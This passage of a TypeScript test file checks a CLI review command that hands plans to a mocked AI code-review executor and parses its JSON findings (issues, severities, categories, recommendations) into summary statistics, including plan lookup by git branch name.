      choices.map((choice) => choice.value)
    );

    const mockExecutor = {
      execute: vi.fn(async (prompt: string, metadata: any) => {
        if (metadata.executionMode === 'review') {
          expect(metadata.planFilePath).toBe(materializedPlanPath);
          const existingMaterializedPlan = await readPlanFile(materializedPlanPath);
          expect(existingMaterializedPlan.details).toBe('Local unsynced materialized edits');
          return JSON.stringify({
            issues: [
              {
                severity: 'major',
                category: 'bug',
                content: 'Missing branch-name autofix coverage',
                file: 'src/tim/commands/review.ts',
                line: '721',
                suggestion: 'Add the missing regression test.',
              },
            ],
            recommendations: [],
            actionItems: [],
          });
        }

        expect(metadata.executionMode).toBe('normal');
        expect(metadata.planFilePath).toBe(materializedPlanPath);
        expect(prompt).toContain('Autofix Request');
        await writeFile(
          materializedPlanPath,
          `---
id: 281
uuid: ${persistedPlan.uuid}
title: DB-only Branch Autofix Plan
goal: Verify branch-name review/autofix materialization
updatedAt: 2026-03-27T10:54:00.000Z
tasks:
  - title: Fix issues from branch-selected review
    description: Materialize before executor handoff
    done: true
---

Updated by branch-name autofix
`
        );
        return 'Autofix completed successfully';
      }),
    };

    const gatherPlanContextMock = vi.fn(async (planArg: string) => {
      expect(planArg).toBe(materializedPlanPath);
      return createMockPlanContext({
        resolvedPlanFile: materializedPlanPath,
        planData: {
          id: 281,
          title: 'DB-only Branch Autofix Plan',
          goal: 'Verify branch-name review/autofix materialization',
          tasks: [
            {
              title: 'Fix issues from branch-selected review',
              description: 'Materialize before executor handoff',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/tim/commands/review.ts'],
          baseBranch: 'main',
          diffContent: 'diff content',
        },
      });
    });

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);
    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);
    vi.mocked(contextGatheringModule.gatherPlanContext).mockImplementation(gatherPlanContextMock);
    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(gitModule.getCurrentBranchName).mockResolvedValue('281-db-only-branch-autofix-plan');

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(undefined, { autofix: true, noSave: true }, mockCommand);

    expect(gatherPlanContextMock).toHaveBeenCalledTimes(1);
    expect(mockExecutor.execute).toHaveBeenCalledTimes(2);
    expect(await Bun.file(materializedPlanPath).exists()).toBe(true);
    const materializedPlan = await readPlanFile(materializedPlanPath);
    expect(materializedPlan.details).toBe('Updated by branch-name autofix');
    expect(materializedPlan.tasks?.[0]?.done).toBe(true);
    const updatedPlan = (await resolvePlanFromDb('281', testDir)).plan;
    expect(updatedPlan.details).toBe('Updated by branch-name autofix');
    expect(updatedPlan.tasks?.[0]?.done).toBe(true);
  });

  test('throws when the branch name does not identify a DB plan', async () => {
    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({} as any);
    vi.mocked(gitModule.getCurrentBranchName).mockResolvedValue(null as any);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await expect(handleReviewCommand(undefined, {}, mockCommand)).rejects.toThrow(
      'No plan file specified and no suitable plans found'
    );
  });

  test('throws when the branch name matches the pattern but the DB plan does not exist', async () => {
    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({} as any);
    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(gitModule.getCurrentBranchName).mockResolvedValue('999-missing-plan');

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await expect(handleReviewCommand(undefined, {}, mockCommand)).rejects.toThrow(
      'No plan file specified and no suitable plans found'
    );
  });
});

describe('JSON output mode integration', () => {
  test('detects JSON output from executor metadata and parses correctly', async () => {
    const planContent = `
id: 200
title: JSON Output Test Plan
goal: Test JSON output parsing
tasks:
  - title: Test task
    description: A test task for JSON output
`;
    const planFile = join(testDir, 'json-output-test.yml');
    await writeFile(planFile, `---\n${planContent}---\n`);

    // JSON output that the executor would return with structured format
    const jsonReviewOutput = JSON.stringify({
      issues: [
        {
          severity: 'critical',
          category: 'security',
          content: 'SQL injection vulnerability in user input',
          file: 'src/db.ts',
          line: '42',
          suggestion: 'Use parameterized queries',
        },
        {
          severity: 'major',
          category: 'performance',
          content: 'N+1 query in user listing',
          file: 'src/api.ts',
          line: '15',
          suggestion: 'Batch database queries',
        },
      ],
      recommendations: ['Add input validation'],
      actionItems: ['Fix SQL injection before release'],
    });

    const mockExecutor = {
      execute: vi.fn(async (prompt: string, metadata: any) => {
        // Return an ExecutorOutput object with metadata.jsonOutput = true
        return {
          content: jsonReviewOutput,
          success: true,
          metadata: {
            jsonOutput: true,
          },
        };
      }),
    };

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue('abc123');

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: planFile,
        planData: {
          id: 200,
          title: 'JSON Output Test Plan',
          goal: 'Test JSON output parsing',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task for JSON output',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/db.ts', 'src/api.ts'],
          baseBranch: 'main',
          diffContent: 'mock diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    // Execute the review command
    await handleReviewCommand(planFile, { noAutofix: true }, mockCommand);

    // Verify the executor was called
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
    expect(mockExecutor.execute).toHaveBeenCalledWith(
      expect.any(String),
      expect.objectContaining({
        executionMode: 'review',
      })
    );
  });

  test('executor string output must be valid JSON', async () => {
    const planContent = `
id: 201
title: JSON Output Test Plan
goal: Test JSON output parsing
tasks:
  - title: Test task
    description: A test task for JSON output
`;
    const planFile = join(testDir, 'json-output-test.yml');
    await writeFile(planFile, `---\n${planContent}---\n`);

    // JSON output that the executor would return in string format
    const jsonReviewOutput = JSON.stringify({
      issues: [
        {
          severity: 'critical',
          category: 'security',
          content: 'SQL injection vulnerability in database queries',
          file: 'src/database.ts',
          line: '88',
          suggestion: 'Use parameterized queries',
        },
      ],
      recommendations: ['Use parameterized queries'],
      actionItems: [],
    });

    const mockExecutor = {
      execute: vi.fn(async (prompt: string, metadata: any) => {
        // Return a plain JSON string (no ExecutorOutput wrapper)
        return jsonReviewOutput;
      }),
    };

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue('def456');

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: planFile,
        planData: {
          id: 201,
          title: 'Text Output Test Plan',
          goal: 'Test text output parsing',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task for text output',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/queries.ts'],
          baseBranch: 'main',
          diffContent: 'mock diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    // Execute the review command - should not throw
    await handleReviewCommand(planFile, { noAutofix: true }, mockCommand);

    // Verify the executor was called
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
  });

  test('executor output with JSON content is parsed correctly', async () => {
    const planContent = `
id: 202
title: JSON Mode Plan
goal: Test JSON mode
tasks:
  - title: Test task
    description: A test task
`;
    const planFile = join(testDir, 'json-mode-test.yml');
    await writeFile(planFile, `---\n${planContent}---\n`);

    const jsonOutput = JSON.stringify({
      issues: [
        {
          severity: 'major',
          category: 'performance',
          content: 'Performance issue detected',
          file: 'src/perf.ts',
          line: '33',
          suggestion: 'Optimize the algorithm',
        },
      ],
      recommendations: [],
      actionItems: [],
    });

    const mockExecutor = {
      execute: vi.fn(async (prompt: string, metadata: any) => {
        // Return an ExecutorOutput object with JSON content
        return {
          content: jsonOutput,
          success: true,
          metadata: {
            jsonOutput: true,
          },
        };
      }),
    };

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue('ghi789');

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: planFile,
        planData: {
          id: 202,
          title: 'Explicit Text Mode Plan',
          goal: 'Test explicit text mode',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'mock diff',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    // Execute the review command
    await handleReviewCommand(planFile, { noAutofix: true }, mockCommand);

    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
  });

  test('summary statistics are correctly calculated from JSON-parsed issues', async () => {
    // This test verifies that when issues are parsed from JSON, the summary
    // statistics (criticalCount, majorCount, etc.) are correctly computed
    const { createReviewResult } = await import('../formatters/review_formatter.js');

    const jsonOutput = JSON.stringify({
      issues: [
        {
          severity: 'critical',
          category: 'security',
          content: 'Issue 1',
          file: 'src/test.ts',
          line: '1',
          suggestion: 'Fix 1',
        },
        {
          severity: 'critical',
          category: 'security',
          content: 'Issue 2',
          file: 'src/test.ts',
          line: '2',
          suggestion: 'Fix 2',
        },
        {
          severity: 'major',
          category: 'performance',
          content: 'Issue 3',
          file: 'src/test.ts',
          line: '3',
          suggestion: 'Fix 3',
        },
        {
          severity: 'minor',
          category: 'style',
          content: 'Issue 4',
          file: 'src/test.ts',
          line: '4',
          suggestion: 'Fix 4',
        },
        {
          severity: 'info',
          category: 'other',
          content: 'Issue 5',
          file: 'src/test.ts',
          line: '5',
          suggestion: 'Fix 5',
        },
      ],
      recommendations: ['Rec 1', 'Rec 2'],
      actionItems: ['Action 1'],
    });

    const result = createReviewResult(
      'test-plan',
      'Test Plan',
      'main',
      ['file1.ts', 'file2.ts', 'file3.ts'],
      jsonOutput
    );

    // Verify summary statistics
    expect(result.summary.totalIssues).toBe(5);
    expect(result.summary.criticalCount).toBe(2);
    expect(result.summary.majorCount).toBe(1);
    expect(result.summary.minorCount).toBe(1);
    expect(result.summary.infoCount).toBe(1);
    expect(result.summary.filesReviewed).toBe(3);

    // Verify category counts
    expect(result.summary.categoryCounts.security).toBe(2);
    expect(result.summary.categoryCounts.performance).toBe(1);
    expect(result.summary.categoryCounts.style).toBe(1);
    expect(result.summary.categoryCounts.other).toBe(1);

    // Verify issues have auto-generated IDs
    expect(result.issues[0].id).toBe('issue-1');
    expect(result.issues[4].id).toBe('issue-5');

    // Verify recommendations and action items
    expect(result.recommendations).toEqual(['Rec 1', 'Rec 2']);
    expect(result.actionItems).toEqual(['Action 1']);
  });

  test('JSON parsing correctly extracts all issue fields including file, line, and suggestion', async () => {
    const { createReviewResult } = await import('../formatters/review_formatter.js');

    const jsonOutput = JSON.stringify({
      issues: [
        {
          severity: 'critical',
          category: 'security',
          content: 'SQL injection vulnerability in user input',
          file: 'src/db.ts',
          line: '42',
          suggestion: 'Use parameterized queries',
        },
        {
          severity: 'major',
          category: 'performance',
          content: 'N+1 query in user listing',
          file: 'src/api.ts',
          line: '15',
          suggestion: 'Use batch queries',
        },
        {
          severity: 'minor',
          category: 'style',
          content: 'Inconsistent naming convention',
          file: 'src/utils.ts',
          line: '25-30',
          suggestion: 'Use consistent naming',
        },
      ],
      recommendations: ['Add input validation', 'Use prepared statements'],
      actionItems: ['Fix SQL injection before release', 'Add performance tests'],
    });

    const result = createReviewResult(
      'test-plan',
      'Test Plan',
      'main',
      ['src/db.ts', 'src/api.ts'],
      jsonOutput
    );

    // Verify first issue has all fields
    expect(result.issues[0]).toMatchObject({
      id: 'issue-1',
      severity: 'critical',
      category: 'security',
      content: 'SQL injection vulnerability in user input',
      file: 'src/db.ts',
      line: '42',
      suggestion: 'Use parameterized queries',
    });

    // Verify second issue has all fields
    expect(result.issues[1]).toMatchObject({
      id: 'issue-2',
      severity: 'major',
      category: 'performance',
      content: 'N+1 query in user listing',
      file: 'src/api.ts',
      line: '15',
      suggestion: 'Use batch queries',
    });

    // Verify third issue has all fields
    expect(result.issues[2]).toMatchObject({
      id: 'issue-3',
      severity: 'minor',
      category: 'style',
      content: 'Inconsistent naming convention',
      file: 'src/utils.ts',
      line: '25-30',
      suggestion: 'Use consistent naming',
    });

    // Verify recommendations and action items arrays
    expect(result.recommendations).toEqual(['Add input validation', 'Use prepared statements']);
    expect(result.actionItems).toEqual([
      'Fix SQL injection before release',
      'Add performance tests',
    ]);
  });

  test('JSON parsing handles empty arrays correctly', async () => {
    const { createReviewResult } = await import('../formatters/review_formatter.js');

    const jsonOutput = JSON.stringify({
      issues: [],
      recommendations: [],
      actionItems: [],
    });

    const result = createReviewResult('test-plan', 'Test Plan', 'main', ['file.ts'], jsonOutput);

    expect(result.issues).toEqual([]);
    expect(result.recommendations).toEqual([]);
    expect(result.actionItems).toEqual([]);
    expect(result.summary.totalIssues).toBe(0);
    expect(result.summary.criticalCount).toBe(0);
    expect(result.summary.majorCount).toBe(0);
    expect(result.summary.minorCount).toBe(0);
    expect(result.summary.infoCount).toBe(0);
  });

  test('JSON parsing extracts all category types correctly', async () => {
    const { createReviewResult } = await import('../formatters/review_formatter.js');

    const jsonOutput = JSON.stringify({
      issues: [
        {
          severity: 'critical',
          category: 'security',
          content: 'Security issue',
          file: 'src/test.ts',
          line: '1',
          suggestion: 'Fix security',
        },
        {
          severity: 'major',
          category: 'performance',
          content: 'Performance issue',
          file: 'src/test.ts',
          line: '2',
          suggestion: 'Fix performance',
        },
        {
          severity: 'major',
          category: 'bug',
          content: 'Bug issue',
          file: 'src/test.ts',
          line: '3',
          suggestion: 'Fix bug',
        },
        {
          severity: 'minor',
          category: 'style',
          content: 'Style issue',
          file: 'src/test.ts',
          line: '4',
          suggestion: 'Fix style',
        },
        {
          severity: 'minor',
          category: 'compliance',
          content: 'Compliance issue',
          file: 'src/test.ts',
          line: '5',
          suggestion: 'Fix compliance',
        },
        {
          severity: 'info',
          category: 'testing',
          content: 'Testing issue',
          file: 'src/test.ts',
          line: '6',
          suggestion: 'Fix testing',
        },
        {
          severity: 'info',
          category: 'other',
          content: 'Other issue',
          file: 'src/test.ts',
          line: '7',
          suggestion: 'Fix other',
        },
      ],
      recommendations: [],
      actionItems: [],
    });

    const result = createReviewResult('test-plan', 'Test Plan', 'main', [], jsonOutput);

    // Verify all category counts
    expect(result.summary.categoryCounts.security).toBe(1);
    expect(result.summary.categoryCounts.performance).toBe(1);
    expect(result.summary.categoryCounts.bug).toBe(1);
    expect(result.summary.categoryCounts.style).toBe(1);
    expect(result.summary.categoryCounts.compliance).toBe(1);
    expect(result.summary.categoryCounts.testing).toBe(1);
    expect(result.summary.categoryCounts.other).toBe(1);

    // Verify severity counts
    expect(result.summary.criticalCount).toBe(1);
    expect(result.summary.majorCount).toBe(2);
    expect(result.summary.minorCount).toBe(2);
    expect(result.summary.infoCount).toBe(2);
    expect(result.summary.totalIssues).toBe(7);
  });
});
